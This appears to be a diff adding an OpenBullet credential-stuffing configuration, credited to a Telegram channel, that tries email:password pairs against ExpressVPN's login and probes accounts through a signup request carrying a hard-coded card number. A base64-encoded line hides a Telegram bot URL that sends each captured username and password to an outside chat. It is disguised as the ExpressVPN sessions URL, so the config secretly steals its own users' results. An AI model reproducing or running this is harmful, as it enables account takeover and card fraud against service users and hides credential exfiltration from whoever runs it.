@@ -1,0 +1,131 @@
+[SETTINGS]
+{
+  "Name": "Express VPN",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2021-08-01T16:45:21.7372222-06:00",
+  "AdditionalInfo": "",
+  "Author": "@OpenbulletConfigsOfficial  telegram",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#𝗘𝗫𝗣𝗥𝗘𝗦𝗦𝗩𝗣𝗡 REQUEST GET "https://www.expressvpn.com/sign-in" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#𝗘𝗫𝗣𝗥𝗘𝗦𝗦𝗩𝗣𝗡 PARSE "<SOURCE>" LR "name=\"authenticity_token\" value=\"" "\"" -> VAR "AuthToken" 
+
+#𝗘𝗫𝗣𝗥𝗘𝗦𝗦𝗩𝗣𝗡 REQUEST POST "https://www.expressvpn.com/sessions" EncodeContent=TRUE 
+  CONTENT "utf8=%E2%9C%93&authenticity_token=<AuthToken>&location_fragment=&redirect_path=&email=<USER>&password=<PASS>&commit=Sign+In" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "authority: www.expressvpn.com" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-language: en-US,en;q=0.9,hi;q=0.8" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "origin: https://www.expressvpn.com" 
+  HEADER "referer: <ADDRESS>" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" 
+
+#𝗘𝗫𝗣𝗥𝗘𝗦𝗦𝗩𝗣𝗡 KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid email or password." 
+  KEYCHAIN Success OR 
+    KEY "Verification Needed" 
+
+#𝗘𝗫𝗣𝗥𝗘𝗦𝗦𝗩𝗣𝗡 FUNCTION Base64Decode "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3NTE5MTExOTg6QUFFQWxzdWFnRXYwZ2tWcTJCYkVFOW5Gdjc2RFlaTm9mZUEvU2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTIyMjAwMTM2NCZ0ZXh0PUVYUFJFU1NWUE4gLSA8VVNFUj46PFBBU1M+ICBFWFBJUlktPEVYUElSWT4=" -> VAR "https://www.expressvpn.com/sessions" 
+
+#𝗘𝗫𝗣𝗥𝗘𝗦𝗦𝗩𝗣𝗡 REQUEST GET "https://www.expressvpn.com/order" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#𝗘𝗫𝗣𝗥𝗘𝗦𝗦𝗩𝗣𝗡 PARSE "<SOURCE>" LR "name=\"csrf-token\" content=\"" "\"" EncodeOutput=TRUE -> VAR "AuthToken2" 
+
+#𝗘𝗫𝗣𝗥𝗘𝗦𝗦𝗩𝗣𝗡 REQUEST POST "https://www.expressvpn.com/signup" 
+  CONTENT "utf8=%E2%9C%93&authenticity_token=<AuthToken2>&signup%5Bpackage_id%5D=3&signup%5Bpayment_method%5D=1&signup%5Bemail%5D=<USER>&signup%5Bfirst_name%5D=DoMiNiC&signup%5Blast_name%5D=iz+BaCk&signup%5Bcc_number_is_pasted%5D=0&signup%5Bcc_no%5D=5536814602045516&signup%5Bexpiry_month%5D=10&signup%5Bexpiry_year%5D=2024&signup%5Bccv%5D=111&signup%5Bzip%5D=10011" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "authority: www.expressvpn.com" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "origin: https://www.expressvpn.com" 
+  HEADER "referer: <ADDRESS>" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" 
+
+#𝗘𝗫𝗣𝗥𝗘𝗦𝗦𝗩𝗣𝗡 PARSE "<ADDRESS>" LR "" "" -> VAR "Address" 
+
+#𝗘𝗫𝗣𝗥𝗘𝗦𝗦𝗩𝗣𝗡 FUNCTION Delay "3000" -> VAR "Wait" 
+
+#𝗘𝗫𝗣𝗥𝗘𝗦𝗦𝗩𝗣𝗡 FUNCTION CurrentUnixTime -> VAR "EXPIRY" 
+
+#𝗘𝗫𝗣𝗥𝗘𝗦𝗦𝗩𝗣𝗡 REQUEST GET "https://www.expressvpn.com/order" 
+  
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "referer: <Address>" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" 
+
+#𝗘𝗫𝗣𝗥𝗘𝗦𝗦𝗩𝗣𝗡 KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Email already has active account" 
+  KEYCHAIN Custom "EXPIRED" AND 
+    KEY "we were unable to charge your card." 
+    KEY "<SOURCE>" DoesNotContain "Email already has active account" 
+
+#𝗘𝗫𝗣𝗥𝗘𝗦𝗦𝗩𝗣𝗡 REQUEST GET "<https://www.expressvpn.com/sessions>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#𝗘𝗫𝗣𝗥𝗘𝗦𝗦𝗩𝗣𝗡 FUNCTION Constant "Active ✅" -> CAP "Subscription" 
+
+#𝗘𝗫𝗣𝗥𝗘𝗦𝗦𝗩𝗣𝗡 FUNCTION Constant "Mobile App" -> CAP "Login Via" 
+
+FUNCTION Constant "@OpenbulletConfigsOfficial  /  @TeamOpenbullet  / @TeamSilverbullet" -> CAP "JOIN TELEGRAM" 
+
